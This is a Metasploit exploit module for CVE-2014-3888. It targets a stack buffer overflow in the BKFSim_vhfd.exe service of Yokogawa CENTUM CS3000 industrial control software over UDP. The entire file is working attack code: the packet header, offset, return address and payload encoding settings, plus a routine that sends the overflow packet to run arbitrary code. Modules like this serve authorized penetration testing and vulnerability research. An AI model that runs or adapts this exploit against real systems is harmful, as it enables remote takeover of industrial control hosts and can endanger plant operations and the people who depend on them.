# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Udp
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Yokogawa CS3000 BKFSim_vhfd.exe Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability
        exists in the service BKFSim_vhfd.exe when using malicious user-controlled data to create
        logs using functions like vsprintf and memcpy in a insecure way. This module has been
        tested successfully on Yokogawa Centum CS3000 R3.08.50 over Windows XP SP3.
      },
      &#039;Author&#039;         =>
        [
          &#039;Redsadic <julian.vilas[at]gmail.com>&#039;,
          &#039;juan vazquez&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-3888&#039;],
          [&#039;URL&#039;, &#039;http://jvn.jp/vu/JVNVU95045914/index.html&#039;],
          [&#039;URL&#039;, &#039;http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0002E.pdf&#039;],
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2014/07/07/r7-2014-06-disclosure-yokogawa-centum-cs-3000-bkfsimvhfdexe-buffer-overflow&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1770, # 2228 (max packet length) - 16 (header) - (438 target[&#039;Offset&#039;]) - 4 (ret)
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039; => "\x00",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Yokogawa Centum CS3000 R3.08.50 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039;    => 0x61e55c9c, # push esp | ret # LibBKCCommon.dll
              &#039;Offset&#039; => 438
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;May 23 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        Opt::RPORT(20010)
      ], self.class)
  end
 
  def exploit
    connect_udp
 
    sploit = "\x45\x54\x56\x48\x01\x01\x10\x09\x00\x00\x00\x01\x00\x00\x00\x44" # header
    sploit << rand_text(target[&#039;Offset&#039;])
    sploit << [target.ret].pack("V")
    sploit << payload.encoded
 
    print_status("Trying target #{target.name}, sending #{sploit.length} bytes...")
    udp_sock.put(sploit)
 
    disconnect_udp
  end
 
end

